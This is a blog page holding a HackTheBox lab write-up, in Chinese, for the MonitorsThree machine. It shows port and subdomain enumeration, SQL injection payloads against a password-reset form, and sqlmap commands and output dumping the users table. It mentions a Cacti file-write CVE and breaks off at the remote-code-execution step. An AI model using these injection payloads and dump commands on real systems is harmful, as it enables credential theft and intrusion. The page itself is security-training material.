@@ -1,0 +1,1181 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content=" Medium难度，好像这个机器还有两个前身，一个Monitored，一个Monitored2. 这次图片上变成3了。\n#NMAP 先扫端口:\nPORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; \\n protocol 2.0) | ssh-hostkey: | 256 86:f8:7d:6f:42:91:bb:89:72:91:af:72:f3:01:ff:5b (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNwl884vMmev5jgPEogyyLoyjEHsq+F9DzOCgtCA4P8TH2TQcymOgliq7Yzf7x1tL+i2mJedm2BGMKOv1NXXfN0= | 256 50:f9:ed:8e:73:64:9e:aa:f6:08:95:14:f0:a6:0d:57 (ED25519) |ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN5W5QMRdl0vUKFiq9AiP+TVxKIgpRQNyo25qNs248Pa 80/tcp open http syn-ack ttl 63 nginx 1.18.0 (Ubuntu) |_http-server-header:nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://monitorsthree.htb/ | http-methods: | Supported Methods: GET HEAD POST OPTIONS #PORT 80 把monitorsthree.htb先加到host里然后访问：\n">
+<title>HTB-Season 6-Monitored</title>
+
+<link rel='canonical' href='http://localhost:1313/htb-season-6-monitored/'>
+
+<link rel="stylesheet" href="/scss/style.min.946cca6c6259ef94ac55abfae7c7bf3291ea3ed5eea17ef77500b257217c6710.css"><meta property='og:title' content="HTB-Season 6-Monitored">
+<meta property='og:description' content=" Medium难度，好像这个机器还有两个前身，一个Monitored，一个Monitored2. 这次图片上变成3了。\n#NMAP 先扫端口:\nPORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; \\n protocol 2.0) | ssh-hostkey: | 256 86:f8:7d:6f:42:91:bb:89:72:91:af:72:f3:01:ff:5b (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNwl884vMmev5jgPEogyyLoyjEHsq+F9DzOCgtCA4P8TH2TQcymOgliq7Yzf7x1tL+i2mJedm2BGMKOv1NXXfN0= | 256 50:f9:ed:8e:73:64:9e:aa:f6:08:95:14:f0:a6:0d:57 (ED25519) |ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN5W5QMRdl0vUKFiq9AiP+TVxKIgpRQNyo25qNs248Pa 80/tcp open http syn-ack ttl 63 nginx 1.18.0 (Ubuntu) |_http-server-header:nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://monitorsthree.htb/ | http-methods: | Supported Methods: GET HEAD POST OPTIONS #PORT 80 把monitorsthree.htb先加到host里然后访问：\n">
+<meta property='og:url' content='http://localhost:1313/htb-season-6-monitored/'>
+<meta property='og:site_name' content='JoWhite'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-01-01T08:44:04&#43;00:00'/><meta property='article:modified_time' content='2025-01-01T08:44:04&#43;00:00'/><meta property='og:image' content='http://localhost:1313/legacy/uploads/2024/08/1724822083-monitor-150x150.webp' />
+<meta name="twitter:title" content="HTB-Season 6-Monitored">
+<meta name="twitter:description" content=" Medium难度，好像这个机器还有两个前身，一个Monitored，一个Monitored2. 这次图片上变成3了。\n#NMAP 先扫端口:\nPORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; \\n protocol 2.0) | ssh-hostkey: | 256 86:f8:7d:6f:42:91:bb:89:72:91:af:72:f3:01:ff:5b (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNwl884vMmev5jgPEogyyLoyjEHsq+F9DzOCgtCA4P8TH2TQcymOgliq7Yzf7x1tL+i2mJedm2BGMKOv1NXXfN0= | 256 50:f9:ed:8e:73:64:9e:aa:f6:08:95:14:f0:a6:0d:57 (ED25519) |ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN5W5QMRdl0vUKFiq9AiP+TVxKIgpRQNyo25qNs248Pa 80/tcp open http syn-ack ttl 63 nginx 1.18.0 (Ubuntu) |_http-server-header:nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://monitorsthree.htb/ | http-methods: | Supported Methods: GET HEAD POST OPTIONS #PORT 80 把monitorsthree.htb先加到host里然后访问：\n"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='http://localhost:1313/legacy/uploads/2024/08/1724822083-monitor-150x150.webp' />
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/en/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_8394d4d868d05114.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">😀</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/en">JoWhite</a></h1>
+            <h2 class="site-description">OraOra!</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/en/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/en/about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/en/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/en/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/en/%E5%8F%8B%E9%93%BE/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友链</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+                    
+                        <li id="i18n-switch">  
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                            <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
+                                
+                                    <option value="http://localhost:1313/" >中文</option>
+                                
+                                    <option value="http://localhost:1313/en/" selected>English</option>
+                                
+                            </select>
+                        </li>
+                    
+                
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#nmap">#NMAP</a></li>
+    <li><a href="#port-80">#PORT 80</a>
+      <ol>
+        <li><a href="#cactimonitorshtb">#cacti.monitors.htb</a></li>
+        <li><a href="#sqli">#SQLi</a></li>
+        <li><a href="#rce">#RCE</a></li>
+      </ol>
+    </li>
+    <li><a href="#post-enumeration">#Post Enumeration</a></li>
+    <li><a href="#user-flag">#User flag</a></li>
+    <li><a href="#enumeration-again">#Enumeration Again..</a>
+      <ol>
+        <li><a href="#root-flag">#Root flag</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/htb-season-6-monitored/">
+                
+                    <img src="/legacy/uploads/2024/08/1724822083-monitor-150x150.webp" loading="lazy" alt="Featured image of post HTB-Season 6-Monitored" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/en/categories/htb/" >
+                HackTheBox Writeups
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/htb-season-6-monitored/">HTB-Season 6-Monitored</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Jan 01, 2025</time>
+            </div>
+        
+
+        
+    </footer>
+    
+
+    
+        <footer class="article-translations">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+            <div>
+                
+                    <a href="http://localhost:1313/htb-season-6-monitored/" class="link">中文</a>
+                
+            </div>
+        </footer>
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <div class="wp-block-image">
+  <figure class="aligncenter size-full"><img loading="lazy" decoding="async" width="300" height="300" src="../wp-contnt/uploads/2024/08/1724834633-monitor.webp" alt="" class="wp-image-280" srcset="../legacy/uploads/2024/08/1724834633-monitor.webp 300w, ../legacy/uploads/2024/08/1724834633-monitor-150x150.webp 150w" sizes="auto, (max-width: 300px) 100vw, 300px" /></figure>
+</div>
+<p>Medium难度，好像这个机器还有两个前身，一个Monitored，一个Monitored2. 这次图片上变成3了。</p>
+<h2 id="nmap">#NMAP
+</h2><p>先扫端口:</p>
+<pre class="wp-block-code language-bash"><code>PORT STATE SERVICE REASON VERSION
+22/tcp open ssh syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; \n
+protocol 2.0)
+| ssh-hostkey:
+| 256 86:f8:7d:6f:42:91:bb:89:72:91:af:72:f3:01:ff:5b (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNwl884vMmev5jgPEogyyLoyjEHsq+F9DzOCgtCA4P8TH2TQcymOgliq7Yzf7x1tL+i2mJedm2BGMKOv1NXXfN0=
+| 256 50:f9:ed:8e:73:64:9e:aa:f6:08:95:14:f0:a6:0d:57 (ED25519)
+|ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN5W5QMRdl0vUKFiq9AiP+TVxKIgpRQNyo25qNs248Pa 
+80/tcp open http syn-ack ttl 63 nginx 1.18.0 (Ubuntu) 
+|_http-server-header:nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://monitorsthree.htb/
+| http-methods: | Supported Methods: GET HEAD POST OPTIONS</code></pre>
+<h2 id="port-80">#PORT 80
+</h2><p>把monitorsthree.htb先加到host里然后访问：<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="575" src="../wp-contnt/uploads/2024/08/1724824509-image-1024x575.png" alt="" class="wp-image-105" srcset="../legacy/uploads/2024/08/1724824509-image-1024x575.png 1024w, ../legacy/uploads/2024/08/1724824509-image-300x169.png 300w, ../legacy/uploads/2024/08/1724824509-image-768x432.png 768w, ../legacy/uploads/2024/08/1724824509-image-1536x863.png 1536w, ../legacy/uploads/2024/08/1724824509-image.png 1858w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>一个提供网络服务的网站。</p>
+<p><a href="http://monitorsthree.htb/login.php" target="_blank"  rel="nofollow" ><a class="link" href="http://monitorsthree.htb/login.php"  target="_blank" rel="noopener"
+    >http://monitorsthree.htb/login.php</a></a> 登录界面，尝试弱口令爆破失败。<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="575" src="../wp-contnt/uploads/2024/08/1724823785-1-1024x575.png" alt="" class="wp-image-98" srcset="../legacy/uploads/2024/08/1724823785-1-1024x575.png 1024w, ../legacy/uploads/2024/08/1724823785-1-300x169.png 300w, ../legacy/uploads/2024/08/1724823785-1-768x431.png 768w, ../legacy/uploads/2024/08/1724823785-1-1536x863.png 1536w, ../legacy/uploads/2024/08/1724823785-1.png 1860w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p><a href="http://monitorsthree.htb/forgot_password.php" target="_blank"  rel="nofollow" ><a class="link" href="http://monitorsthree.htb/forgot_password.php"  target="_blank" rel="noopener"
+    >http://monitorsthree.htb/forgot_password.php</a></a> 还有一个忘记密码页面，用来重设密码。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" decoding="async" width="823" height="772" src="../wp-contnt/uploads/2024/08/1724824640-image.png" alt="" class="wp-image-107" srcset="../legacy/uploads/2024/08/1724824640-image.png 823w, ../legacy/uploads/2024/08/1724824640-image-300x281.png 300w, ../legacy/uploads/2024/08/1724824640-image-768x720.png 768w" sizes="auto, (max-width: 823px) 100vw, 823px" /> </figure></p>
+<p>尝试修改admin密码：<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" decoding="async" width="567" height="639" src="../wp-contnt/uploads/2024/08/1724824751-image.png" alt="" class="wp-image-109" srcset="../legacy/uploads/2024/08/1724824751-image.png 567w, ../legacy/uploads/2024/08/1724824751-image-266x300.png 266w" sizes="auto, (max-width: 567px) 100vw, 567px" /> </figure></p>
+<p>尝试其他的用户名：<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" decoding="async" width="562" height="668" src="../wp-contnt/uploads/2024/08/1724824799-image.png" alt="" class="wp-image-112" srcset="../legacy/uploads/2024/08/1724824799-image.png 562w, ../legacy/uploads/2024/08/1724824799-image-252x300.png 252w" sizes="auto, (max-width: 562px) 100vw, 562px" /> </figure></p>
+<p>说明admin用户存在。用gobuster遍历目录：<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="449" src="../wp-contnt/uploads/2024/08/1724823981-2-1024x449.png" alt="" class="wp-image-103" srcset="../legacy/uploads/2024/08/1724823981-2-1024x449.png 1024w, ../legacy/uploads/2024/08/1724823981-2-300x132.png 300w, ../legacy/uploads/2024/08/1724823981-2-768x337.png 768w, ../legacy/uploads/2024/08/1724823981-2-1536x673.png 1536w, ../legacy/uploads/2024/08/1724823981-2.png 1891w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>用filename wordlist遍历各个目录找到了<a href="http://monitorsthree.htb/admin/navbar.php" target="_blank"  rel="nofollow" ><a class="link" href="http://monitorsthree.htb/admin/navbar.php"  target="_blank" rel="noopener"
+    >http://monitorsthree.htb/admin/navbar.php</a></a>可以不用验证直接访问。但除此之外没有找到有用的东西。<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="650" src="../wp-contnt/uploads/2024/08/1724824886-image-1024x650.png" alt="" class="wp-image-117" srcset="../legacy/uploads/2024/08/1724824886-image-1024x650.png 1024w, ../legacy/uploads/2024/08/1724824886-image-300x190.png 300w, ../legacy/uploads/2024/08/1724824886-image-768x487.png 768w, ../legacy/uploads/2024/08/1724824886-image.png 1455w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<h3 id="cactimonitorshtb">#cacti.monitors.htb
+</h3><p>用ffuf遍历可能的subdomain：<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="449" src="../wp-contnt/uploads/2024/08/1724825032-image-1024x449.png" alt="" class="wp-image-122" srcset="../legacy/uploads/2024/08/1724825032-image-1024x449.png 1024w, ../legacy/uploads/2024/08/1724825032-image-300x131.png 300w, ../legacy/uploads/2024/08/1724825032-image-768x336.png 768w, ../legacy/uploads/2024/08/1724825032-image-1536x673.png 1536w, ../legacy/uploads/2024/08/1724825032-image.png 1872w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>发现子域名：<strong>cacti</strong>，加入hosts文件并访问。<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="562" src="../wp-contnt/uploads/2024/08/1724825103-image-1024x562.png" alt="" class="wp-image-126" srcset="../legacy/uploads/2024/08/1724825103-image-1024x562.png 1024w, ../legacy/uploads/2024/08/1724825103-image-300x165.png 300w, ../legacy/uploads/2024/08/1724825103-image-768x422.png 768w, ../legacy/uploads/2024/08/1724825103-image.png 1442w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p class="has-text-align-center">
+  <em>Cacti 是一个开源的网络监控和图形绘制工具，它主要用于收集和显示来自各种设备（如路由器、交换机、服务器等）的网络数据，并将这些数据以图形化的方式呈现出来。Cacti 是基于 PHP 开发的网页应用，通常运行在 LAMP（Linux, Apache, MySQL, PHP）环境中。</em>
+</p>
+<p>尝试默认密码admin/admin失败。搜索对应版本的vulns，找到了CVE-2024-25641。此漏洞利用/lib/import.php中定义的import_packge()方法实现arbitrary files write。在利用这个漏洞前还是需要一个valid credential。gobuster遍历目录：</p>
+<pre class="wp-block-code language-bash"><code>Output:
+http://cacti.monitorsthree.htb/app (Status: 301) &#91;--&gt; http://cacti.monitorsthree.htb/app/]
+http://cacti.monitorsthree.htb/cacti (Status: 301) &#91;--&gt; http://cacti.monitorsthree.htb/cacti/]</code></pre>
+<p>/cacti指向当前登录页面，/app指向先前的网页。</p>
+<h3 id="sqli">#SQLi
+</h3><p>在<a href="http://monitorsthree.htb/forgot_password.php" target="_blank"  rel="nofollow" ><a class="link" href="http://monitorsthree.htb/forgot_password.php"  target="_blank" rel="noopener"
+    >http://monitorsthree.htb/forgot_password.php</a></a>网页尝试SQLi:</p>
+<p><strong>1&rsquo; or &lsquo;1&rsquo;=&lsquo;1&rsquo;-- -</strong><figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" decoding="async" width="652" height="693" src="../wp-contnt/uploads/2024/08/1724825780-image.png" alt="" class="wp-image-135" srcset="../legacy/uploads/2024/08/1724825780-image.png 652w, ../legacy/uploads/2024/08/1724825780-image-282x300.png 282w" sizes="auto, (max-width: 652px) 100vw, 652px" /> </figure></p>
+<p>再尝试</p>
+<p><strong>1&rsquo; or &lsquo;1&rsquo;=&lsquo;2&rsquo;-- -</strong><figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" decoding="async" width="628" height="690" src="../wp-contnt/uploads/2024/08/1724826188-image.png" alt="" class="wp-image-140" srcset="../legacy/uploads/2024/08/1724826188-image.png 628w, ../legacy/uploads/2024/08/1724826188-image-273x300.png 273w" sizes="auto, (max-width: 628px) 100vw, 628px" /> </figure></p>
+<p>可以确定有SQLi漏洞了，用burpsuite保存请求，使用sqlmap看能不能获取到数据库：</p>
+<pre class="wp-block-code language-bash"><code>sqlmap -r req --batch --dbs
+Output:
+...
+&#91;16:28:10] &#91;INFO] checking if the injection point on POST parameter 'username' is a false positive
+POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? &#91;y/N] N
+sqlmap identified the following injection point(s) with a total of 61 HTTP(s) requests:
+---
+Parameter: username (POST)
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=test' AND (SELECT 4162 FROM (SELECT(SLEEP(5)))PcgJ) AND 'Iwlg'='Iwlg
+---
+&#91;16:29:26] &#91;INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.18.0
+back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)
+&#91;16:29:26] &#91;INFO] fetching database names
+&#91;16:29:26] &#91;INFO] fetching number of databases
+&#91;16:29:26] &#91;INFO] resumed: 2
+&#91;16:29:26] &#91;INFO] resumed: information_schema
+&#91;16:29:26] &#91;INFO] resumed: monitorsthree_db
+available databases &#91;2]:
+&#91;*] information_schema
+&#91;*] monitorsthree_db</code></pre>
+<p>ok，成功了，服务器正在运行MySQL服务器。monitorsthree_db看起来不像是默认数据库，尝试得到tables list。</p>
+<pre class="wp-block-code language-bash"><code>sqlmap -r req --batch -D monitorsthree_db --tables</code></pre>
+<p>跑了半小时也才蹦出来几个表名，实在等不下去了去dm了做出来的老哥。。。老哥说靠猜parameter。。。那好吧，猜一下表中会有user table。</p>
+<pre class="wp-block-code language-bash"><code>sqlmap -r req --batch -D monitorsthree_db -T users --threads 10 --technique=T --level=3 --risk=3 --dump</code></pre>
+<ul class="wp-block-list">
+  <li>
+    <em>-r: 请求文件，此处是从burpsuite里copy下来的请求</em>
+  </li>
+  <li>
+    <em>--batch：自动接受默认选项</em>
+  </li>
+  <li>
+    <em>-D：数据库名</em>
+  </li>
+  <li>
+    <em>-T：table 名</em>
+  </li>
+  <li>
+    <em>--threads: 线程数</em>
+  </li>
+  <li>
+    <em>--technique：SQLi的技术，此处为Timebased</em>
+  </li>
+  <li>
+    <em>--level：</em>注入强度
+  </li>
+  <li>
+    <em>--risk：注入危险级别</em>
+  </li>
+  <li>
+    <em>--dump：提取数据</em>
+  </li>
+</ul>
+<p>果然有user table.</p>
+<pre class="wp-block-code language-bash"><code>...
+&#91;16:40:51] &#91;INFO] retrieved: id
+&#91;16:41:22] &#91;INFO] retrieved: username
+&#91;16:43:19] &#91;INFO] retrieved: email
+&#91;16:44:30] &#91;INFO] retrieved: password
+...</code></pre>
+<p>提取到了两个重要的column名 username password，实在是太慢了，修改一下cmd</p>
+<pre class="wp-block-code language-bash"><code>sqlmap -r req --batch -D monitorsthree_db -T users --threads 10 --technique=T -C username,password --level=3 --risk=3 --dump</code></pre>
+<ul class="wp-block-list">
+  <li>
+    -C: column名
+  </li>
+</ul>
+<p>终于看到了有用的信息</p>
+<pre class="wp-block-code language-bash"><code>admin:green******</code></pre>
+<p>用拿到的信息登录cacti<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="492" src="../wp-contnt/uploads/2024/08/1724828226-image-1024x492.png" alt="" class="wp-image-180" srcset="../legacy/uploads/2024/08/1724828226-image-1024x492.png 1024w, ../legacy/uploads/2024/08/1724828226-image-300x144.png 300w, ../legacy/uploads/2024/08/1724828226-image-768x369.png 768w, ../legacy/uploads/2024/08/1724828226-image-1536x738.png 1536w, ../legacy/uploads/2024/08/1724828226-image.png 1871w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<h3 id="rce">#RCE
+</h3><p>搜索后在github找到了这个漏洞的Poc，<a href="https://github.com/5ma1l/CVE-2024-25641" target="_blank"  rel="nofollow" ><a class="link" href="https://github.com/5ma1l/CVE-2024-25641"  target="_blank" rel="noopener"
